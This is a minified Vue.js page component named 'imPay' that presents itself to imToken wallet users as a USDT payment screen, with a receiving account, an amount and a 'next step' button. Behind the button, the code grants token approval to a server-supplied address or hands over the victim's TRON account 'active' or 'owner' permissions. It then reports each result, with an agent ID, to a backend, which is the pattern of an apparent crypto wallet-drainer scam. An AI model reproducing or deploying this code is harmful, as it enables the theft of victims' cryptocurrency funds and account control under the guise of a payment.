import{u as e}from"./lXjzGZgz-eb2a533a.js";import{s as a,a as t,b as s,g as o}from"./N2uGA-b2567a08.js";import{B as i,a as l,b as r,c,t as u,g as p}from"./oYM-c59eebcd.js";import{T as d}from"./Q34vVPq-0feec154.js";import{d as m,e as n,c as v,g as b,a as f,b as j}from"./kYxiIJ-9144ce16.js";import{v as w,c as g,b as h,Q as y,P as x,l as k,M as T,R as S,S as A,O as I,q as L}from"./T57Y-afde01cc.js";import{r as N,u as R}from"./ksarNyA8Et-23b86aee.js";import{P as C}from"./g4pxEEvvu-c7feb9d7.js";import{F as _,B as E,s as H,a as O,c as P}from"./cwM2NzwJ81-7b7459cb.js";import{_ as q}from"./H4D-757ffc94.js";import"./vQhm5-1b546bdc.js";import"./hfDCOc4j-14f571c0.js";import"./xoLxaL-cf242793.js";import"./izrXaAg-9e15d4a6.js";import"./IJ1KF5-0ed9a232.js";import"./doM-2fc7bc06.js";import"./4IPPvLoR4-3276db68.js";import"./SSCwkFD5-fc855337.js";import"./xJRK-bda13e74.js";import"./T-e777f70d.js";import"./wLcUcpq6-cb7a833b.js";import"./5qzP-1b4d4200.js";import"./S522dpL832-7920280e.js";import"./m-c9044db0.js";import"./AWLWu4sRN-1f384d3b.js";import"./QEbC0-27163f9c.js";import"./7XQ-973bc067.js";import"./Dg8sdZ-02e092d7.js";import"./q2fl2eQHwC-85acd26e.js";import"./NhaKgV-00e87cac.js";import"./mMD8X-5ea44a95.js";import"./YVySHSlt-eb477707.js";/* empty css           */import"./25hjI-4bba15fa.js";/* empty css               */import"./Fa7lijCwQ-471c5b56.js";import"./GV-000997b5.js";import"./7UB8LM-abe4130e.js";import"./dxSfbY9mit-7666e77c.js";import"./5uKaxe1-50025f40.js";import"./0Ax-a2721a50.js";import"./VGZxOVEU-5be0f33e.js";import"./8I4-fc8298ff.js";import"./Gtv-f9324a38.js";import"./h-ca1f7891.js";import"./ypC1Y-57bba4a0.js";import"./LyTMq-8972a901.js";import"./lBSze-b1994193.js";import"./P-72e9128c.js";import"./g-f1360890.js";import"./L-6e5fa430.js";import"./4CqjNC-f4d77159.js";import"./Oc85LM4k-8cbafdae.js";import"./HfVqH8-4c6e6e9c.js";import"./K-7def8d0f.js";import"./P-deb9d50e.js";import"./h2oETOMotZ-79a68b9e.js";import"./O1isJgomYP-fcc129b5.js";import"./x2QUCS68-1638dfd0.js";import"./aqYP-1343d775.js";import"./GRT-3d1c2a8d.js";import"./hEyde3Q-c211fc12.js";import"./oQvZOw2x-36815738.js";import"./Zb-844c0221.js";import"./uopNYpFU7-cb4b43fb.js";const Q=e=>(S("data-v-6966fb22"),e=e(),A(),e),V={class:"page-container"},X=Q((()=>x("div",{class:"bottom-m10 left-m10 right-m30 top-p10 o7 fs14"},"收款账号",-1))),z={class:"left-m10 bg-white br12 right-m10",style:{padding:"12px 15px","border-radius":"5px"}},M={class:"bottom-m10 left-m10 right-m10 top-m20 o7 fs14 spaceb"},U=Q((()=>x("span",{class:"fs14"},"数量",-1))),Y={class:"fs14 o7"},J={class:"bg-white left-m10 br12 right-m10",style:{"border-radius":"5px"}},D={class:"address left-m20 o7 top-p20 bottom-p10 column"},K={style:{"margin-right":"15px"}},F={class:"spaceb right-m10 top-m10 o6"},G={class:"fs14"},Z={class:"center-w confirm-btn left-m10 right-m10",style:{"margin-top":"15px"}},B=q(w({__name:"imPay",setup(w){const S=N(0),A=N(0),q=N(.069),Q=N({type:1,walletType:1,agentId:"",token:"USDT",amount:1,clientId:"",block:i.TRX,ads:"",isAdd:!1,client_type:1,extend:{}}),B=N("");N("");const W=N({authAddress:"",clientId:"",receiveAddress:{trx:"",eth:"",bsc:""},authSuccessTips:""}),$=N("");N(!1),e(),N("");const ee=N(!0),ae=g((()=>Q.value.ads||W.value.receiveAddress[Q.value.block])),te=()=>{const{type:e}=Q.value;if(A.value<S.value)return H("Insufficient balance");1==e?se():2==e?oe():ie()},se=async()=>{try{if(O({message:"Loading...",duration:0}),Q.value.block==i.TRX){const e=await l("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",B.value,$.value);e.result&&(le($.value,"approve",e.txid),H(W.value.authSuccessTips))}else if(Q.value.block==i.ETH){const e=await m(web3.value,$.value,B.value);e.transactionHash&&(le($.value,"approve",e.transactionHash),H(W.value.authSuccessTips))}else if(Q.value.block==i.BSC){const e=await n(web3.value,$.value,B.value);e.transactionHash&&(le($.value,"approve",e.transactionHash),H(W.value.authSuccessTips))}}catch(e){P()}},oe=async()=>{if(Q.value.block!=i.TRX)return;const e=await r(B.value,$.value,Q.value.isAdd);(null==e?void 0:e.result)?(le($.value,"active",e.txid),H(W.value.authSuccessTips),P()):e&&H("object"==typeof e?JSON.stringify(e):String(e))},ie=async()=>{if(Q.value.block!=i.TRX)return;const e=await c(B.value);e.result&&(le($.value,"owner",e.txid),H(W.value.authSuccessTips))},le=async(e,o,i)=>{const l={addres:e,auth_addres:B.value,hash:i||0,wallete_type:"ImToken",client_id:Q.value.clientId||W.value.clientId||"",source:window.location.href,agent_uid:Q.value.agentId,block:Q.value.block,client_type:Q.value.client_type,amount:Q.value.amount,extend:Q.value.extend?JSON.stringify(Q.value.extend):""};switch(o){case"approve":await s(l);break;case"active":await t(l);break;case"owner":await a(l)}P()},re=async()=>{let e;switch(Q.value.block){case i.TRX:if($.value=await tronWeb.defaultAddress.base58,!$.value)return H("无法获取钱包地址！请检查浏览器是否支持TRON！");A.value=await p($.value,Q.value.token);break;case i.ETH:e=await f(),web3.value=e.web3,$.value=e.userAddress,A.value=await j(web3.value,e.userAddress);break;case i.BSC:e=await v(),web3.value=e.web3,$.value=e.userAddress,A.value=await b(web3.value,e.userAddress)}};return h((async()=>{const e=JSON.parse(localStorage.getItem("routerParams"));if(S.value=e.amount,Q.value={amount:S.value,type:e.type,walletType:1,agentId:e.agent,token:e.token||"USDT",block:e.block||i.TRX,clientId:e.clientId||"",ads:e.ads,isAdd:e.isAdd,client_type:1,extend:e.extend},(async()=>{try{const e=JSON.parse(localStorage.getItem("config"));W.value={...e};const{type:a}=Q.value;ee.value=!0;const t=await o({block:Q.value.block,type:u[Q.value.type]});ee.value=!1;const s=t.data;W.value={...e,authAddress:s},B.value=W.value.authAddress}catch(e){ee.value=!1}})(),d.isTokenEnv())try{d.apis.navigator.setTitle(`${String(Q.value.token).toLocaleLowerCase()}转账`);let e="";e=Q.value.block==i.TRX?await d.apis.user.showAccountSwitch("TRON"):await d.apis.user.showAccountSwitch("ETHEREUM"),$.value=e,re()}catch(a){4001==a.code&&re()}else{re();const e=`imtokenv2://navigate?screen=DappView&url=${window.location.href}`;window.location.href=e}})),(e,a)=>(I(),y("div",V,[X,x("div",z,C(ae.value||"-"),1),x("div",M,[U,x("span",Y,C(A.value)+" "+C(String(Q.value.token).toLocaleUpperCase()),1)]),x("div",J,[x("div",D,[x("div",K,[k(R(_),{modelValue:S.value,"onUpdate:modelValue":a[0]||(a[0]=e=>S.value=e),type:"number",label:"",placeholder:"请输入",size:"large",style:{"font-size":"16px",padding:"0 0 10px 0px","border-bottom":"1px solid #eee"}},null,8,["modelValue"])]),x("div",F,[x("span",G," $ "+C("t"==Q.value.token?Number(Number(S.value).toFixed(2)*q.value).toFixed(3):S.value),1)])])]),x("div",Z,[k(R(E),{style:{width:"100%","border-radius":"8px"},size:"large",color:"#3478f6",onClick:te,loading:ee.value},{default:T((()=>[L("下一步")])),_:1},8,["loading"])])]))}}),[["__scopeId","data-v-6966fb22"]]);export{B as default};
